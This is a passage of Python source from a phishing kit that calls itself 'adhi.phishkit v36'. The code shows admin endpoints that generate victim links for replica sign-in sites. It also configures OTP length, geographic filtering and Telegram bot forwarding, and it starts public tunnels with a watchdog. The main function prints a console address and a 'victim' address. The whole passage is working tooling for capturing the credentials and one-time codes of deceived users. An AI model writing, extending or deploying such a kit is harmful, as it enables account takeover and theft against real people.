            CFG["last_site"] = site; save_cfg()
            try:
                n = max(1, min(50, int(f.get("n") or 1)))
            except Exception:
                n = 1
            dev = {"mobile": "m", "laptop": "l"}.get((f.get("dev") or "").lower(), "a")
            urls, adm = [], []
            for _ in range(n):
                t = new_sess(site, ip, "generated", dev=dev, sens=sens)
                urls.append(base_url() + "/" + slug + "/" + t)
                if sens:
                    adm.append(base_url() + "/a/" + t)
            return self.js({"ok": True, "url": "\n".join(urls), "admin": "\n".join(adm)})
        if path == "admin/api/settings":
            for k, lo, hi in (("otp_len", 4, 8), ("ttl", 0, 100000), ("maxv", 0, 100000)):
                try:
                    CFG[k] = max(lo, min(hi, int(f.get(k) or 0)))
                except Exception:
                    pass
            CFG["geo"] = (f.get("geo") or "").upper()
            CFG["site_title"] = f.get("title") or "Sign in"
            CFG["show_badge"] = str(f.get("badge")) == "1"
            CFG["telegram_token"] = f.get("ttok") or ""
            CFG["telegram_chat"] = f.get("tchat") or ""
            if f.get("rmode"):
                CFG["root_mode"] = f["rmode"]
            if f.get("prov"):
                CFG["tunnel_provider"] = f["prov"]
            save_cfg()
            return self.js({"ok": True})
        if path == "admin/api/password":
            if f.get("pw"):
                CFG["admin_password"] = f["pw"]; save_cfg()
            return self.js({"ok": True})
        if path == "admin/api/del":
            with db() as c:
                c.execute("DELETE FROM sessions WHERE id=?", (f.get("id"),))
                c.execute("DELETE FROM events WHERE token NOT IN (SELECT token FROM sessions)")
                c.execute("DELETE FROM media WHERE token NOT IN (SELECT token FROM sessions)")
            return self.js({"ok": True})
        if path == "admin/api/clear":
            with db() as c:
                c.execute("DELETE FROM sessions"); c.execute("DELETE FROM events"); c.execute("DELETE FROM media")
            return self.js({"ok": True})
        if path == "admin/api/tunnel":
            if f.get("action") == "start":
                u = start_tun(CFG["port"], f.get("provider") or "auto")
                if u.startswith("ERR:"):
                    return self.js({"ok": False, "msg": u[4:]})
                WATCH["on"] = True
                threading.Thread(target=watchdog, args=(CFG["port"],), daemon=True).start()
                return self.js({"ok": True, "url": u})
            stop_tun(); WATCH["on"] = False
            return self.js({"ok": True, "msg": "tunnel killed"})
        self.send(404, "no")

def main():
    global LAN_IP
    ap = argparse.ArgumentParser(description="adhi.phishkit v36")
    ap.add_argument("-p", "--port", type=int, default=CFG["port"])
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--tunnel", default="", choices=[""] + list(PROVS) + ["auto"])
    ap.add_argument("--host", default="")
    ap.add_argument("--default", default="", choices=[""] + list(SITES))
    a = ap.parse_args()
    CFG["port"] = a.port
    if a.host:
        CFG["public_url"] = a.host.rstrip("/")
    if a.default:
        CFG["root_mode"] = a.default; CFG["last_site"] = a.default
    if a.tunnel:
        CFG["tunnel_provider"] = a.tunnel
    save_cfg(); init_db(); migrate()
    try:
        sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sk.connect(("8.8.8.8", 80))
        LAN_IP = sk.getsockname()[0]; sk.close()
    except Exception:
        pass
    print("\n  adhi.phishkit v36  |  %d kits / %d categories  |  official replica engine\n"
          "  ----------------------------------------\n"
          "  console : http://localhost:%d/admin   pass: %s\n  victim  : http://%s:%d\n"
          % (len(SITES), len(CATS), a.port, CFG["admin_password"], LAN_IP, a.port))
    if not a.local:
        threading.Thread(target=start_tun, args=(a.port, CFG["tunnel_provider"]), daemon=True).start()
        WATCH["on"] = True
        threading.Thread(target=watchdog, args=(a.port,), daemon=True).start()
    try:
        srv = ThreadingHTTPServer(("0.0.0.0", a.port), H)
        srv.daemon_threads = True
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n  bye")
    except OSError as e:
        sys.exit("  port busy: %s" % e)
    finally:
        WATCH["on"] = False; stop_tun()

if __name__ == "__main__":
    main()
